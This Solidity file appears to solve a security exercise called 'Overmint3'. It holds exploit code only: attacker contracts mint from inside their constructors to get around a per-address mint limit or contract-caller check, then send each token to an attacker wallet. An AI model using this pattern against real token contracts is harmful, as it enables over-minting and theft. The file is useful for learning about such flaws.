// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

interface IOvermint3 {
    function mint() external;
    function balanceOf(address owner) external view returns (uint256 balance);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}

contract Overmint3_Attacker {
    constructor(address _overmint3, address _attackerWallet) {
        IOvermint3(_overmint3).mint();
        IOvermint3(_overmint3).transferFrom(address(this), _attackerWallet, IOvermint3(_overmint3).totalSupply());
    }
}

contract Attack {
    constructor(address _overmint3, address _attackerWallet) {
        new Overmint3_Attacker(_overmint3, _attackerWallet);
        new Overmint3_Attacker(_overmint3, _attackerWallet);
        new Overmint3_Attacker(_overmint3, _attackerWallet);
        new Overmint3_Attacker(_overmint3, _attackerWallet);
        new Overmint3_Attacker(_overmint3, _attackerWallet);
    }
}
